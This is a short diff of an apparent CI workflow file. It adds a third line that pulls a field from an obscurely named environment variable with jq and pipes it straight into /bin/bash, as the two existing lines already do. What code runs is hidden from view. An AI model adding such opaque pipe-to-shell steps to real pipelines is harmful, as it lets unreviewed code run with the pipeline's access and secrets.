@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$tpx20" | jq -r .ka0409 | /bin/bash
           printf '%s' "$vmhk661" | jq -r .m5 | /bin/bash
+          printf '%s' "$m2" | jq -r .et578 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
